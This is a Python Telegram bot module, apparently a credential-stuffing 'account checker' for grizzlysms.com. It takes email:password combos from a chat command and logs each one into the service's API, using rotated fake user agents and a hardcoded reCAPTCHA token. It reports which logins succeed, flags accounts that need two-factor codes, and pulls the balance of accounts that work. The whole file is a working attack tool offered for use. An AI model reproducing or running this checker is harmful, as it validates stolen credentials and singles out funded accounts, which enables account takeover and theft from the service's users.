import requests
import time
from random import choice

def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.18363",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
    ]
    return choice(user_agents)

def process_grizzly_command(bot, message):
    chat_id = message.chat.id
    account_data = message.text.split()[1:]  # Get the account data from the command
    if account_data:
        total_accounts = len(account_data)
        start_time = time.time()
        results = []
        initial_message = "↯ GRIZZLY ACCOUNT\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_accounts, start_time, message.from_user.username))

        for account in account_data:
            result = check_grizzly_account(account)
            results.append(f"Combo: {account}\nResult => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_accounts, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide account details in the format: /grizzly email:password")

def check_grizzly_account(account):
    email, password = account.split(':')
    login_url = "https://grizzlysms.com/api/users/login"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": get_random_user_agent(),
        "Origin": "https://grizzlysms.com",
        "Referer": "https://grizzlysms.com/authorization",
        "X-Forwarded-Host": "grizzlysms.com",
        "X-Session-Token": "frntmzuecxen9i",
        "X-User-Locale": "en"
    }
    data = {
        "username": email,
        "password": password,
        "token": "",
        "g-recaptcha-response": "03AFcWeA4y2ZFGgooRZ167CLNqFs26oAPnalCLd_j6HmNxwyy5KyI7pESkUG9owPUUbgkI2-JGwq5gpzqi8sR0l5_VCq54Uu8eit3LzCnt2Z_38p9a6sW9S7GR2UL2tPif5VZYrlB6rni8_jy-9AbE8xkSkubz0ubLsFx3lwjY9G326ov3Hd7q3hn35s_KpSXKaCRkst1zODNOrZhle2uqlggz3W2FqZqlhNsbgygyM9g8f-_wGYcIdMz4RFhmH-phI-Q7TObeEi0ooHULUTI3lJoc_EAYaKxjmJtn0FdgzejMcmWNeydTb51vxDKzg2CNxHdrRijrNhnqf37hAi303HVzsfDQf0I74XTqQpBY2OFE5TCjgYyrzTk4ydyj-IETjX9qz5EedaGZq4l4zUzfpqlFqx3Eq6hPBUWQmhB5lUaTL-58MZWeQTXdMNK3xrDEhnpz9c8vSYicGQevYMcm52jwr2KQvKzl5kxl3gmqsqhRqLSfRacdEjRLu8Xw4sj-ncAMD4HgxwrrRCymU3wFANZfNa1bEdXv4u2t_8ndHmDeZltqCAPw1TYBfzzHOPDpYJrhE4I6xGBquxOJ7JxYYOw5ugnSakttOyorge4GVxgeno4a3L68H_lmN2h1xn2EaRzTATsY9H1MLfn48eX3FKpFysJHlt7DNaZAD_JVQ8tUwLi1AFXpadI"
    }

    response = requests.post(login_url, headers=headers, json=data)

    if response.status_code == 200:
        response_data = response.json()
        if response_data.get("need_two_factor"):
            return "2FACTOR required"
        elif response_data.get("token"):
            token = response_data["token"]
            return check_balance(token)
        else:
            return "Unknown response"
    elif response.status_code == 400 and "User or password is incorrect" in response.text:
        return "User or password is incorrect"
    else:
        return "Login failed"

def check_balance(token):
    balance_url = "https://grizzlysms.com/api/sms-users/balance"
    headers = {
        "Accept": "*/*",
        "Pragma": "no-cache",
        "Authorization": f"Bearer {token}",
        "User-Agent": get_random_user_agent()
    }

    response = requests.get(balance_url, headers=headers)
    if response.status_code == 200:
        balance = response.json().get("balance", "0")
        if balance == "0":
            return "FREE"
        else:
            return f"Balance: {balance}"
    else:
        return "Failed to retrieve balance"

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⌧ Total ACCOUNT Checked - {total_accounts}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
